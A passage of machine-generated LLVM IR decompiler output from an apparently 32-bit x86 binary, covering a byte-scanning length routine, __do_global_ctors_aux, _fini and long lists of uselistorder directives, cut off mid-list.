dec_label_pc_805805a.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805805a10 = add i32 %arg2, %arg1
  %v3_805805a11 = inttoptr i32 %v2_805805a10 to i8*
  %v4_805805a12 = load i8, i8* %v3_805805a11, align 1
  %v1_805805e14 = add i32 %arg2, 1
  %v1_805806115 = icmp eq i8 %v4_805805a12, 0
  %v1_805806316 = icmp eq i1 %v1_805806115, false
  br i1 %v1_805806316, label %dec_label_pc_8058049, label %dec_label_pc_8058065

dec_label_pc_8058040:                             ; preds = %dec_label_pc_8058049
  %v1_8058040 = add i32 %v0_805804017, 2
  br label %dec_label_pc_8058065

dec_label_pc_8058049:                             ; preds = %dec_label_pc_805805a.preheader, %dec_label_pc_805805a
  %v1_805805e19 = phi i32 [ %v1_805805e, %dec_label_pc_805805a ], [ %v1_805805e14, %dec_label_pc_805805a.preheader ]
  %v5_805805a18.in = phi i8 [ %v4_805805a, %dec_label_pc_805805a ], [ %v4_805805a12, %dec_label_pc_805805a.preheader ]
  %v0_805804017 = phi i32 [ %v2_8058057, %dec_label_pc_805805a ], [ %arg2, %dec_label_pc_805805a.preheader ]
  %v5_805805a18 = zext i8 %v5_805805a18.in to i32
  %v1_805804b = and i32 %v5_805805a18, 192
  %v6_8058050 = icmp eq i32 %v1_805804b, 192
  %v2_8058057 = add i32 %v5_805805a18, %v1_805805e19
  br i1 %v6_8058050, label %dec_label_pc_8058040, label %dec_label_pc_805805a

dec_label_pc_805805a:                             ; preds = %dec_label_pc_8058049
  store i32 %v2_8058057, i32* @ecx, align 4
  %v2_805805a = add i32 %v2_8058057, %arg1
  %v3_805805a = inttoptr i32 %v2_805805a to i8*
  %v4_805805a = load i8, i8* %v3_805805a, align 1
  %v1_805805e = add i32 %v2_8058057, 1
  %v1_8058061 = icmp eq i8 %v4_805805a, 0
  %v1_8058063 = icmp eq i1 %v1_8058061, false
  br i1 %v1_8058063, label %dec_label_pc_8058049, label %dec_label_pc_8058065

dec_label_pc_8058065:                             ; preds = %dec_label_pc_805805a.preheader, %dec_label_pc_805805a, %dec_label_pc_8058040
  %v0_8058065 = phi i32 [ %v1_8058040, %dec_label_pc_8058040 ], [ %v1_805805e14, %dec_label_pc_805805a.preheader ], [ %v1_805805e, %dec_label_pc_805805a ]
  %v2_8058067 = sub i32 %v0_8058065, %arg2
  br label %dec_label_pc_8058069

dec_label_pc_8058069:                             ; preds = %entry, %dec_label_pc_8058065
  %v0_805806c = phi i32 [ -1, %entry ], [ %v2_8058067, %dec_label_pc_8058065 ]
  ret i32 %v0_805806c

; uselistorder directives
  uselistorder i8 %v4_805805a, { 1, 0 }
  uselistorder i32 %v2_8058057, { 2, 3, 1, 0 }
  uselistorder i32 192, { 1, 3, 2, 4, 0 }
  uselistorder i32 2, { 150, 58, 151, 86, 155, 156, 55, 56, 57, 0, 1, 152, 157, 158, 159, 128, 160, 161, 162, 163, 164, 165, 134, 2, 135, 136, 62, 166, 167, 3, 87, 63, 140, 141, 82, 168, 169, 170, 172, 129, 185, 186, 68, 142, 143, 83, 12, 13, 72, 73, 193, 69, 127, 11, 88, 121, 89, 122, 90, 123, 64, 14, 139, 60, 91, 92, 4, 93, 5, 94, 6, 95, 96, 15, 16, 74, 17, 18, 137, 19, 20, 21, 75, 188, 22, 23, 84, 24, 173, 174, 175, 176, 7, 76, 181, 182, 153, 154, 183, 184, 65, 66, 67, 25, 194, 77, 8, 9, 144, 145, 71, 26, 27, 146, 28, 147, 29, 78, 148, 149, 30, 171, 187, 192, 85, 31, 138, 32, 97, 100, 98, 99, 101, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 102, 103, 79, 48, 49, 50, 51, 52, 53, 104, 124, 105, 80, 106, 125, 107, 108, 126, 70, 109, 110, 111, 130, 131, 132, 133, 112, 113, 114, 115, 177, 59, 178, 10, 179, 116, 61, 180, 117, 118, 119, 191, 81, 189, 54, 190, 120 }
  uselistorder i8 0, { 39, 4, 7, 8, 40, 6, 5, 148, 149, 10, 156, 151, 152, 9, 154, 155, 153, 31, 157, 1, 2, 59, 60, 61, 158, 159, 34, 160, 11, 13, 137, 136, 12, 41, 161, 162, 163, 80, 81, 16, 171, 167, 168, 166, 14, 169, 170, 15, 32, 172, 173, 182, 183, 184, 185, 186, 204, 205, 18, 139, 138, 17, 140, 141, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 3, 196, 98, 99, 226, 100, 229, 42, 54, 37, 38, 76, 19, 228, 210, 211, 62, 212, 213, 214, 215, 216, 217, 43, 218, 21, 194, 195, 20, 150, 101, 102, 55, 29, 28, 0, 44, 45, 46, 103, 187, 199, 200, 135, 177, 178, 174, 176, 175, 104, 105, 106, 107, 108, 109, 110, 111, 112, 22, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 30, 126, 127, 128, 129, 130, 131, 132, 133, 57, 227, 179, 180, 181, 134, 164, 165, 63, 64, 23, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 79, 142, 143, 144, 145, 146, 147, 56, 35, 188, 189, 190, 191, 192, 193, 197, 198, 201, 202, 203, 24, 206, 207, 36, 208, 33, 209, 219, 224, 223, 25, 220, 221, 27, 222, 26, 225, 58, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 120, 121, 13, 122, 123, 124, 125, 14, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 36, 43, 37, 38, 39, 40, 41, 42, 142, 143, 8, 9, 110, 1, 111, 51, 11, 17, 144, 145, 15, 10, 16, 146, 151, 152, 153, 154, 155, 158, 159, 160, 161, 12, 112, 2, 113, 52, 53, 30, 54, 148, 149, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 27, 80, 81, 82, 83, 28, 84, 24, 18, 46, 47, 48, 49, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 19, 186, 162, 163, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 20, 202, 203, 205, 206, 207, 208, 204, 211, 156, 0, 31, 32, 147, 85, 86, 87, 88, 89, 90, 91, 29, 92, 93, 94, 95, 96, 97, 21, 22, 3, 4, 98, 99, 23, 100, 101, 102, 103, 104, 106, 107, 108, 109, 34, 35, 105, 209, 150, 210, 212, 213, 214, 33, 44, 45, 50, 114, 115, 116, 117, 118, 119, 157 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058069, { 1, 0 }
  uselistorder label %dec_label_pc_8058065, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058049, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805807c = load i32, i32* @global_var_805c000.538, align 16384
  %v10_8058081 = icmp eq i32 %v0_805807c, -1
  br i1 %v10_8058081, label %dec_label_pc_805809c, label %dec_label_pc_8058090.preheader

dec_label_pc_8058090.preheader:                   ; preds = %entry
  br label %dec_label_pc_8058090

dec_label_pc_8058090:                             ; preds = %dec_label_pc_8058090.preheader, %dec_label_pc_8058090
  %v4_8058093 = phi i32 [ %v0_805807c, %dec_label_pc_8058090.preheader ], [ %v2_8058095, %dec_label_pc_8058090 ]
  %v0_8058090 = phi i32 [ ptrtoint (i32* @global_var_805c000.538 to i32), %dec_label_pc_8058090.preheader ], [ %v1_8058090, %dec_label_pc_8058090 ]
  %v1_8058090 = add i32 %v0_8058090, -4
  call void @__pseudo_call(i32 %v4_8058093)
  %v1_8058095 = inttoptr i32 %v1_8058090 to i32*
  %v2_8058095 = load i32, i32* %v1_8058095, align 4
  %v10_8058097 = icmp eq i32 %v2_8058095, -1
  %v1_805809a = icmp eq i1 %v10_8058097, false
  br i1 %v1_805809a, label %dec_label_pc_8058090, label %dec_label_pc_805809c.loopexit

dec_label_pc_805809c.loopexit:                    ; preds = %dec_label_pc_8058090
  %v2_805809c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805809c

dec_label_pc_805809c:                             ; preds = %dec_label_pc_805809c.loopexit, %entry
  %v2_805809c = phi i32 [ %v2_805809c.pre, %dec_label_pc_805809c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_805809c

; uselistorder directives
  uselistorder i32 %v0_805807c, { 1, 0 }
  uselistorder i1 false, { 938, 518, 5, 3, 4, 7, 519, 520, 522, 521, 6, 524, 523, 533, 42, 43, 528, 532, 530, 531, 69, 525, 526, 529, 534, 535, 536, 537, 538, 162, 164, 165, 166, 167, 163, 168, 169, 172, 61, 170, 62, 171, 539, 540, 545, 44, 541, 542, 544, 543, 546, 547, 552, 551, 548, 549, 550, 8, 0, 9, 458, 459, 460, 70, 553, 554, 555, 556, 557, 558, 337, 338, 339, 559, 45, 560, 340, 341, 342, 884, 567, 46, 10, 562, 563, 564, 565, 566, 582, 583, 47, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 866, 867, 869, 868, 11, 461, 462, 463, 464, 343, 344, 345, 602, 603, 575, 576, 577, 346, 347, 348, 349, 350, 351, 352, 99, 353, 354, 355, 356, 357, 358, 844, 845, 846, 847, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 939, 940, 63, 2, 375, 71, 101, 376, 377, 885, 886, 887, 956, 957, 958, 959, 962, 72, 963, 964, 961, 955, 941, 140, 447, 448, 449, 450, 451, 452, 942, 943, 102, 232, 233, 234, 235, 236, 237, 12, 453, 454, 64, 515, 13, 615, 616, 173, 946, 947, 948, 949, 950, 953, 954, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 888, 174, 175, 176, 177, 178, 179, 180, 181, 182, 901, 902, 903, 904, 905, 906, 907, 908, 909, 38, 911, 910, 915, 912, 913, 914, 14, 916, 917, 455, 456, 874, 604, 605, 607, 608, 960, 16, 841, 840, 15, 527, 378, 379, 73, 854, 855, 856, 858, 857, 17, 859, 380, 18, 606, 860, 861, 457, 381, 580, 578, 579, 19, 48, 568, 573, 572, 74, 574, 570, 569, 75, 571, 183, 581, 184, 100, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 402, 401, 403, 404, 405, 406, 407, 409, 39, 410, 408, 411, 413, 412, 20, 414, 415, 417, 416, 76, 418, 419, 420, 421, 422, 103, 423, 424, 111, 112, 425, 113, 114, 426, 427, 115, 428, 429, 104, 116, 430, 431, 432, 433, 434, 105, 435, 106, 117, 107, 436, 108, 437, 438, 439, 109, 440, 110, 441, 118, 442, 443, 444, 159, 160, 944, 77, 945, 21, 584, 585, 586, 587, 588, 589, 561, 951, 952, 185, 186, 187, 188, 189, 190, 877, 212, 193, 119, 191, 192, 78, 79, 194, 195, 22, 23, 196, 197, 198, 199, 200, 201, 202, 24, 25, 203, 204, 205, 206, 207, 208, 209, 210, 66, 65, 211, 213, 80, 41, 120, 40, 121, 122, 123, 124, 214, 125, 217, 215, 216, 218, 219, 220, 221, 126, 222, 127, 223, 224, 225, 227, 226, 26, 228, 229, 230, 231, 238, 239, 240, 128, 241, 242, 243, 244, 245, 246, 249, 129, 247, 248, 89, 90, 250, 49, 251, 252, 253, 254, 255, 256, 257, 260, 130, 258, 259, 87, 88, 261, 50, 262, 263, 264, 265, 266, 267, 268, 51, 269, 270, 271, 272, 273, 274, 275, 278, 131, 276, 277, 85, 86, 279, 280, 281, 282, 283, 284, 287, 132, 285, 286, 83, 84, 288, 97, 52, 289, 290, 291, 96, 292, 293, 294, 295, 296, 297, 300, 133, 298, 299, 81, 82, 301, 98, 53, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 134, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 445, 446, 465, 135, 486, 136, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 91, 92, 487, 488, 489, 490, 491, 492, 493, 494, 495, 1, 496, 137, 497, 498, 499, 138, 500, 501, 139, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 516, 517, 609, 610, 611, 612, 613, 28, 614, 27, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 54, 824, 825, 826, 827, 828, 68, 829, 830, 831, 832, 833, 834, 835, 836, 837, 842, 838, 839, 55, 843, 848, 95, 849, 56, 850, 57, 851, 853, 852, 29, 864, 862, 863, 30, 865, 31, 870, 871, 872, 32, 873, 67, 875, 876, 878, 879, 880, 58, 881, 882, 883, 918, 934, 919, 920, 921, 922, 927, 931, 932, 933, 33, 923, 93, 924, 925, 926, 59, 37, 928, 36, 60, 35, 929, 930, 34, 935, 936, 937, 161, 94, 965, 966, 967 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 45, 22, 36, 37, 38, 39, 51, 52, 53, 54, 5, 55, 1, 50, 23, 40, 3, 41, 42, 43, 6, 56, 57, 58, 59, 60, 61, 7, 48, 46, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 8, 2, 44, 9, 0, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_805c000.538 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 441, 906, 254, 769, 907, 250, 908, 51, 909, 269, 910, 911, 40, 443, 442, 41, 270, 271, 912, 255, 251, 915, 380, 916, 917, 918, 346, 919, 0, 426, 149, 148, 920, 921, 445, 444, 202, 201, 203, 922, 446, 923, 447, 204, 924, 925, 448, 206, 205, 207, 802, 803, 804, 805, 806, 807, 808, 809, 810, 452, 451, 450, 427, 449, 428, 129, 128, 127, 130, 811, 812, 455, 454, 453, 429, 430, 71, 67, 69, 66, 68, 70, 318, 926, 927, 246, 422, 928, 929, 272, 930, 347, 931, 932, 456, 180, 319, 936, 933, 934, 935, 256, 459, 458, 457, 62, 61, 937, 460, 99, 885, 886, 887, 273, 888, 938, 939, 940, 461, 209, 208, 211, 210, 348, 941, 181, 942, 462, 80, 274, 275, 159, 161, 160, 162, 276, 463, 163, 320, 1, 465, 464, 107, 108, 466, 212, 467, 79, 349, 468, 247, 946, 947, 252, 948, 277, 257, 949, 950, 951, 952, 953, 954, 955, 278, 471, 470, 469, 971, 972, 973, 974, 975, 976, 977, 978, 2, 979, 279, 980, 981, 982, 280, 983, 984, 281, 985, 986, 987, 988, 989, 350, 439, 473, 472, 168, 167, 169, 321, 322, 1037, 1038, 1039, 1040, 258, 889, 890, 891, 474, 23, 475, 838, 476, 164, 165, 323, 956, 431, 213, 352, 839, 840, 841, 282, 351, 477, 842, 843, 844, 283, 845, 846, 489, 488, 487, 486, 485, 484, 483, 482, 481, 480, 479, 478, 223, 222, 219, 215, 220, 214, 216, 218, 217, 221, 1014, 1015, 3, 174, 173, 172, 171, 170, 490, 224, 225, 491, 22, 21, 847, 848, 492, 75, 74, 76, 1097, 1098, 1099, 493, 184, 183, 185, 182, 849, 494, 114, 113, 116, 111, 112, 115, 324, 325, 497, 496, 495, 498, 57, 499, 501, 500, 37, 503, 502, 72, 505, 504, 52, 506, 226, 507, 227, 508, 228, 509, 229, 511, 510, 175, 513, 512, 24, 515, 514, 166, 517, 516, 50, 518, 522, 521, 520, 519, 44, 1102, 1103, 1104, 525, 524, 523, 198, 200, 199, 326, 527, 526, 530, 529, 528, 230, 531, 327, 392, 768, 4, 537, 536, 535, 534, 533, 532, 81, 82, 1100, 540, 539, 538, 96, 94, 95, 353, 541, 831, 832, 833, 834, 542, 85, 84, 86, 83, 87, 328, 329, 393, 264, 394, 395, 265, 396, 543, 544, 88, 89, 900, 770, 253, 901, 397, 902, 432, 545, 92, 91, 90, 93, 546, 195, 192, 191, 193, 197, 196, 194, 154, 151, 153, 155, 150, 152, 354, 548, 547, 355, 549, 356, 550, 357, 553, 552, 551, 398, 556, 555, 554, 231, 358, 1051, 1052, 1053, 557, 78, 1054, 1055, 259, 1056, 1057, 1058, 65, 63, 64, 399, 1050, 284, 232, 233, 235, 234, 359, 330, 813, 814, 815, 816, 560, 559, 558, 157, 156, 158, 360, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 285, 1068, 1069, 1070, 1071, 1072, 333, 1073, 1074, 245, 334, 1075, 1076, 1077, 1078, 331, 332, 1079, 1080, 1081, 563, 562, 561, 47, 46, 45, 49, 48, 335, 336, 564, 337, 338, 286, 568, 567, 566, 565, 43, 287, 400, 569, 570, 571, 572, 573, 574, 575, 576, 990, 5, 991, 361, 266, 362, 995, 6, 581, 580, 579, 578, 577, 142, 143, 582, 583, 1016, 1017, 584, 97, 587, 586, 585, 60, 588, 1007, 1008, 1009, 913, 914, 850, 851, 440, 589, 77, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 852, 992, 993, 994, 591, 590, 136, 135, 134, 1032, 1033, 593, 592, 133, 132, 131, 267, 1034, 882, 883, 594, 30, 29, 31, 1106, 595, 125, 124, 126, 596, 597, 959, 960, 961, 288, 144, 363, 364, 365, 958, 598, 366, 367, 957, 289, 7, 600, 599, 236, 368, 601, 42, 369, 602, 186, 339, 603, 188, 187, 853, 854, 771, 291, 855, 856, 857, 858, 859, 861, 862, 863, 292, 864, 865, 401, 290, 866, 293, 867, 868, 869, 860, 607, 606, 605, 604, 120, 122, 121, 117, 118, 119, 123, 870, 608, 56, 53, 55, 54, 294, 609, 871, 872, 611, 610, 138, 137, 873, 874, 772, 773, 340, 875, 341, 876, 877, 878, 295, 879, 370, 880, 614, 613, 612, 32, 36, 34, 33, 35, 296, 371, 8, 372, 615, 616, 59, 58, 1101, 618, 617, 237, 238, 342, 1105, 619, 239, 373, 244, 374, 962, 963, 964, 965, 966, 967, 968, 969, 970, 623, 622, 621, 620, 106, 626, 625, 624, 627, 375, 943, 944, 376, 377, 945, 629, 628, 631, 630, 98, 633, 632, 139, 634, 39, 635, 240, 637, 636, 102, 638, 38, 639, 100, 640, 101, 28, 642, 641, 189, 643, 178, 644, 190, 645, 241, 646, 647, 649, 648, 179, 650, 103, 652, 651, 146, 654, 653, 147, 655, 656, 145, 73, 817, 260, 381, 268, 818, 9, 10, 248, 403, 657, 774, 819, 820, 821, 822, 823, 824, 825, 343, 297, 402, 378, 404, 826, 666, 665, 664, 663, 662, 661, 660, 659, 658, 433, 110, 827, 828, 672, 671, 670, 669, 434, 668, 667, 405, 829, 830, 674, 673, 775, 298, 835, 836, 776, 299, 300, 777, 301, 302, 778, 303, 304, 779, 780, 305, 781, 306, 782, 783, 784, 785, 786, 787, 788, 789, 675, 176, 177, 406, 407, 677, 676, 837, 408, 681, 680, 679, 678, 881, 409, 684, 683, 682, 884, 685, 892, 790, 791, 792, 793, 794, 795, 344, 410, 893, 686, 691, 690, 689, 688, 687, 435, 25, 26, 27, 894, 895, 11, 411, 692, 896, 897, 898, 696, 695, 694, 693, 140, 141, 899, 700, 699, 698, 697, 903, 797, 12, 798, 799, 800, 801, 904, 905, 706, 705, 704, 703, 702, 701, 104, 105, 412, 413, 707, 711, 710, 709, 708, 385, 796, 996, 712, 713, 242, 243, 307, 714, 13, 716, 715, 14, 15, 309, 997, 414, 308, 345, 998, 999, 718, 717, 386, 1000, 1001, 415, 382, 383, 1002, 719, 436, 1003, 1004, 720, 384, 416, 310, 1005, 1006, 727, 726, 725, 724, 723, 722, 721, 249, 1010, 1011, 728, 387, 729, 730, 731, 732, 311, 1012, 1013, 734, 733, 735, 1018, 1019, 16, 417, 1020, 312, 313, 1021, 1022, 738, 737, 736, 437, 1023, 740, 739, 1024, 742, 741, 418, 1035, 744, 743, 1036, 745, 388, 1041, 1042, 389, 1043, 1044, 390, 391, 1045, 1046, 746, 1047, 17, 1048, 419, 420, 750, 749, 748, 747, 421, 18, 314, 1049, 752, 751, 754, 753, 19, 757, 756, 755, 759, 758, 1082, 1083, 423, 1091, 1092, 263, 1093, 761, 760, 379, 20, 763, 762, 315, 1084, 262, 1085, 1086, 316, 1087, 261, 1089, 1090, 317, 424, 425, 1088, 438, 1094, 1095, 764, 1096, 1107, 109, 766, 765, 767 }
  uselistorder label %dec_label_pc_8058090, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80580a7 = load i32, i32* @ebx, align 4
  %v1_80580a8 = call i32 @__get_pc_thunk_bx(i32 %v0_80580a7)
  store i32 %v1_80580a8, i32* @eax, align 4
  %v0_80580b3 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80580b3

; uselistorder directives
  uselistorder i32* @eax, { 13, 32, 110, 2, 111, 112, 1, 113, 0, 31, 109, 114, 33, 115, 56, 57, 59, 14, 58, 116, 121, 117, 118, 119, 120, 4, 5, 88, 89, 181, 122, 40, 37, 129, 38, 130, 131, 132, 133, 42, 43, 149, 150, 44, 151, 45, 152, 46, 47, 48, 153, 154, 155, 156, 49, 157, 158, 159, 160, 50, 142, 169, 183, 52, 184, 185, 187, 53, 188, 6, 186, 10, 12, 182, 107, 15, 60, 61, 162, 62, 170, 172, 173, 171, 63, 64, 174, 175, 177, 178, 176, 161, 51, 7, 8, 138, 139, 140, 39, 141, 134, 135, 136, 137, 65, 66, 143, 144, 67, 68, 90, 92, 91, 93, 94, 96, 55, 95, 145, 146, 41, 147, 148, 123, 34, 35, 124, 125, 126, 127, 36, 128, 16, 69, 70, 71, 17, 18, 20, 19, 72, 74, 75, 73, 76, 77, 78, 79, 80, 81, 21, 82, 22, 83, 23, 24, 84, 25, 85, 26, 86, 87, 27, 3, 97, 98, 28, 99, 100, 101, 102, 103, 104, 105, 29, 106, 30, 54, 108, 163, 164, 165, 166, 167, 168, 189, 179, 180, 9, 11 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1411, 19, 20, 21, 126, 81, 912, 1412, 1415, 1413, 1414, 913, 1145, 1146, 305, 1426, 1418, 1420, 1421, 24, 70, 1422, 1423, 1424, 914, 1425, 139, 140, 141, 1416, 1417, 148, 1427, 1428, 1430, 1431, 1429, 1432, 268, 1433, 1434, 1435, 1436, 1437, 1438, 150, 151, 915, 340, 341, 1035, 916, 1036, 149, 1037, 1038, 1039, 1040, 1041, 1042, 84, 85, 1043, 1044, 1045, 881, 1046, 83, 917, 82, 918, 152, 153, 919, 22, 920, 1047, 23, 921, 154, 342, 922, 923, 155, 924, 1441, 925, 1439, 247, 1440, 343, 344, 156, 157, 71, 926, 1442, 1443, 1444, 1445, 1446, 345, 927, 928, 158, 1447, 25, 86, 1373, 121, 122, 929, 1448, 87, 930, 26, 931, 1147, 346, 1449, 1450, 1451, 1148, 1149, 16, 269, 160, 159, 1150, 1151, 270, 1152, 932, 1452, 1453, 933, 1153, 934, 1154, 1155, 1156, 1157, 1454, 161, 935, 162, 347, 1461, 1457, 1458, 1459, 1460, 129, 27, 1474, 1475, 1488, 1489, 1490, 1491, 1497, 1498, 1499, 1500, 1492, 1493, 1494, 1495, 1496, 88, 89, 936, 1501, 1502, 163, 937, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 164, 1582, 1583, 165, 1584, 1585, 1586, 90, 130, 271, 142, 938, 131, 1158, 166, 1159, 28, 132, 123, 1160, 227, 167, 1161, 0, 1162, 1462, 1463, 1470, 348, 1471, 939, 1163, 349, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 168, 940, 1171, 1172, 1173, 1174, 169, 1175, 941, 222, 350, 170, 942, 943, 944, 171, 1176, 272, 1177, 1563, 1564, 1565, 273, 328, 329, 1566, 1567, 1568, 1569, 1570, 1571, 945, 274, 1178, 124, 946, 1179, 172, 275, 276, 1180, 1181, 947, 1182, 1183, 1184, 1185, 117, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1, 228, 1186, 133, 1187, 229, 948, 949, 1188, 173, 1189, 1594, 1609, 1610, 1611, 351, 1612, 1386, 1613, 1056, 1666, 1667, 1668, 1669, 1670, 1048, 1671, 1614, 1615, 1672, 174, 1673, 1684, 1685, 29, 950, 2, 147, 951, 952, 1697, 1701, 230, 1702, 175, 854, 352, 353, 3, 1674, 1675, 1676, 176, 177, 1003, 880, 178, 953, 1353, 277, 278, 179, 1354, 1355, 180, 181, 1357, 1356, 1358, 1359, 354, 855, 1360, 1362, 1361, 1363, 1677, 1678, 182, 954, 1683, 1095, 1096, 1097, 1098, 955, 956, 1099, 1100, 1101, 279, 183, 184, 185, 355, 356, 125, 357, 1365, 1364, 358, 1372, 186, 187, 957, 1049, 958, 1050, 188, 959, 189, 960, 1400, 91, 1401, 1402, 1403, 1404, 1405, 4, 961, 1543, 962, 1051, 1052, 1053, 1054, 963, 190, 1686, 856, 191, 280, 1690, 1693, 1692, 1618, 281, 1619, 1620, 1621, 1622, 282, 1623, 1624, 1625, 359, 1616, 360, 1617, 361, 964, 1057, 143, 1058, 283, 965, 1059, 966, 967, 362, 857, 968, 363, 858, 192, 969, 1626, 1627, 193, 194, 364, 859, 145, 73, 74, 1628, 1629, 1630, 1631, 1632, 1633, 195, 196, 365, 860, 144, 1634, 231, 1635, 127, 1636, 1637, 1639, 970, 1638, 5, 1055, 6, 1691, 1366, 1367, 1368, 1369, 1371, 1370, 7, 284, 1595, 1596, 1597, 1521, 971, 285, 1522, 972, 1523, 1524, 1525, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1587, 1572, 197, 198, 973, 974, 286, 1698, 1700, 30, 1419, 8, 199, 1190, 1191, 366, 1192, 200, 975, 1193, 232, 134, 1578, 1579, 1194, 92, 1526, 976, 287, 288, 201, 1195, 1196, 1197, 202, 1472, 93, 977, 1464, 978, 1469, 1468, 233, 979, 980, 1465, 1467, 1466, 234, 981, 1060, 1473, 1061, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 203, 982, 1210, 289, 1211, 1212, 1213, 1214, 1215, 31, 32, 983, 255, 256, 1216, 1217, 1218, 1219, 204, 1220, 1221, 1222, 984, 1223, 33, 34, 205, 985, 1224, 1225, 1226, 1229, 1227, 1228, 35, 75, 94, 1230, 1231, 1232, 1233, 330, 1234, 1235, 206, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 208, 1244, 1245, 1246, 986, 1247, 1248, 235, 236, 1249, 1250, 1251, 209, 207, 1252, 210, 1253, 1254, 987, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 211, 988, 989, 212, 1274, 1275, 1276, 990, 991, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 992, 993, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 994, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 290, 995, 291, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 292, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 36, 95, 96, 97, 98, 1333, 1334, 1335, 1336, 1337, 1338, 213, 1339, 996, 1340, 1341, 1342, 1343, 861, 1344, 1345, 1346, 1347, 1348, 1349, 214, 997, 128, 72, 118, 1262, 237, 1679, 1680, 238, 1682, 1681, 99, 367, 998, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 293, 1486, 215, 999, 1000, 1487, 1350, 216, 1455, 1001, 1456, 1665, 217, 1406, 1687, 1688, 1689, 1062, 1573, 1593, 1063, 1600, 1694, 146, 294, 1655, 1699, 1601, 1656, 1064, 1602, 218, 1065, 1066, 1067, 1068, 1069, 1070, 1072, 1073, 1071, 1074, 1551, 1603, 1604, 1075, 1695, 1696, 883, 223, 371, 